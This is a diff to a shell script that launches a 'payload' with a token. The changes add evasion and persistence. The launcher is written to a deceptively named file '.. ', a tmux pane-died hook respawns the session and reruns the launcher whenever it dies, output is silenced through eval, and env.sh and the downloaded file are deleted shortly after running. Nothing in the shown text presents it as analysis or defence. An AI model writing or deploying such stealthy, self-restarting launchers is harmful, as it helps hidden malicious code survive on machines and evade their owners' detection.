@@ -79,8 +79,9 @@ else
             endpoints_fallback
 fi
 
-export pl_token="${pl_token}" pl_name="${pl_name:-payload}"
+pl_token="${pl_token}" pl_name="${pl_name:-payload}"
 echo "export \
+pl_token=\"${pl_token}\" pl_name=\"${pl_name:-payload}\"
 X_TOKEN=acstkn \
 $ENV_VARS \
 ">env.sh
@@ -95,10 +96,14 @@ if [ "$TMX" = 1 ]; then
     tmux  setenv -g pl_name "$pl_name"
 
     tmux new -d -s crt
-    echo "$launcher" > .tmp.launcher
-    tmux send-keys -t crt "bash < ./.tmp.launcher" Enter
-    (sleep 5 && rm -f .tmp.launcher env.sh "$filename") &>/dev/null &
+    tmux set-option -t crt remain-on-exit
+    tmux set-hook -t crt pane-died 'run-shell "tmux respawn-pane -t crt; tmux send-keys -t crt \"exec bash < \\".. \\"\" Enter"'
+    echo "$launcher" > ".. "
+    sleep 1
+    tmux send-keys -t crt "exec bash < \".. \"" Enter
+    (sleep 5 && rm -f env.sh "$filename") &>/dev/null &
 else
     (sleep 5 && rm -f env.sh "$filename") &>/dev/null &
-    exec bash <<<"$(printf '%s' "$launcher")"
+    sleep 1
+    eval "$(printf '%s' "$launcher")" &>/dev/null
 fi
